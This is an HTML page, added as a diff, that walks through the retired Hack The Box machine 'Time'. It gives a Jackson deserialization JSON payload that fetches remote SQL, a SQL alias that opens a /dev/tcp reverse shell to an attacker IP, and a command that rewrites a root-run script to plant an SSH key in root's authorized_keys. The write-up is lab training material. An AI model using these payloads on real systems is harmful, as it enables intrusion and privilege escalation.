@@ -1,0 +1,147 @@
+<html>
+
+<head>
+    <link rel="stylesheet" href="static/css/style.css">
+</head>
+
+<body>
+    <aside>
+        <iframe src="nav.html"></iframe>
+    </aside>
+
+    <aside class="index">
+        <h1>page index</h1>
+        <ol>
+            <li><a href="#information">information</a></li>
+            <li><a href="#foothold">foothold and user</a></li>
+            <li><a href="#root">root</a></li>
+        </ol>
+    </aside>
+
+    <article>
+        <h1>Time</h1>
+        <section id="information">
+            <h2>1. Information</h2>
+            <ul>
+                <li> Linux</li>
+                <li> Medium class</li>
+                <li> Released Oct 2020</li>
+                <li> Retired Apr 2021</li>
+            </ul>
+
+            <p> Time is a medium machine with an exploitable JSON parser a writable script run by root.</p>
+        </section>
+
+        <section id="foothold">
+            <h2>2. Foothold & user</h2>
+            <p>A basic nmap scan <span>nmap -sC -sV -T4 -v time.htb</span> will find only two open services, SSH and
+                HTTP
+                at their appropriate ports.</p>
+            <code>
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-favicon: Unknown favicon MD5: 7D4140C76BF7648531683BFA4F7F8C22
+| http-methods:
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Online JSON parser
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+            </code>
+        </section>
+
+        <p>An online JSON validator greets us when navigating to <span>http://time.htb</span>.
+            Playing around with it will format a JSON string by default. Optionally it has a beta feature to validate
+            the
+            JSON input.</p>
+
+        <img src="static/img/time_1.jpg" />
+        <figcaption>The JSON validator</figcaption>
+
+        <p>The validator will return <span>null</span> upon beautifying invalid entries, but when fuzzing the beta
+            option
+            the validator returns a Java exception:</p>
+        <code>
+Validation failed: Unhandled Java exception: com.fasterxml.jackson.core.JsonParseException: Unrecognized token 'asd': was expecting ('true', 'false' or 'null')
+        </code>
+
+        <p>It is revealed here that the app uses Jackson, a Java JSON serialization library. Searching for <span>java
+                jackson rce</span> may lead you to <a
+                href="https://blog.doyensec.com/2019/07/22/jackson-gadgets.html">CVE-2019-12384</a>, which details a
+            vulnerability in Jackson reflection code. This would allow us to use the JDBC API to execute SQL and achieve
+            remote code execution.</p>
+
+        <p>
+            Let's try it by setting up a listener with <span>nc -lvnp 8000</span> and using
+            <span>["ch.qos.logback.core.db.DriverManagerConnectionSource",
+                {"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM
+                'http://10.10.14.41:8000/hello'"}]</span> as a test payload.
+
+        </p>
+        <code>
+GET /hello HTTP/1.1
+User-Agent: Java/11.0.8
+Host: 10.10.14.41:8000
+Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+Connection: keep-alive
+        </code>
+        <figcaption>The request sent by JDBC to the attacking machine</figcaption>
+        <p>
+            The request came through, so now it's time to try the exploit. Let's create the SQL payload from the
+            CVE:
+        </p>
+
+        <code>
+CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
+    String[] command = {"bash", "-c", cmd};
+    java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("A");
+    return s.hasNext() ? s.next() : "";  }
+$$;
+CALL SHELLEXEC('setsid bash -i &>/dev/tcp/10.10.14.41/4444 0>&1 &')
+        </code>
+        <figcaption>Our <span>payload.sql</span> code</figcaption>
+
+
+        <img src="static/img/time_2.jpg" />
+        <figcaption>Sending the payload</figcaption>
+        <p>Then start a Python HTTP server with <span>python3 -m http.server</span> and send the payload. Doing this
+            successfully drops us into a shell as user <span>pericles</span> and the user flag immediately
+            available.
+        </p>
+
+        <code>id
+uid=1000(pericles) gid=1000(pericles) groups=1000(pericles)</code>
+
+        <section id="root">
+            <h2>3. Root</h2>
+            Looking around the system we find that a non-standard <span>/usr/bin/timer_backup.sh</span> script that is
+            writable for <span>pericles</span> exists.
+            <code>
+#!/bin/bash
+zip -r website.bak.zip /var/www/html && mv website.bak.zip /root/backup.zip
+            </code>
+            <p>It simply takes a backup from the website at <span>/var/www/html</span>. Judging by the code this is
+                executed as root.</p>
+
+            <p>As this file is writable and seems to be run on a timer (confirmed by checking out
+                <span>systemctl</span>), we have many options. Let's try if we can
+                SSH
+                into the root user locally since <span>ssh-keygen</span> is available.
+            </p>
+
+            <p>First, create a key with <span>ssh-keygen</span> with the default options as <span>pericles</span>.
+                Then
+                we modify the timer script as such:</p>
+            <code>
+echo 'cat /home/pericles/.ssh/id_rsa.pub > /root/.ssh/authorized_keys; chmod 0600 /root/.ssh/authorized_keys' > /usr/bin/timer_backup.sh
+            </code>
+
+            <p>After waiting a while, we can verify it worked by executing <span>ssh root@localhost</span> and
+                retrieve the root flag.</p>
+
+        </section>
+
+    </article>
+</body>
+
+</html>
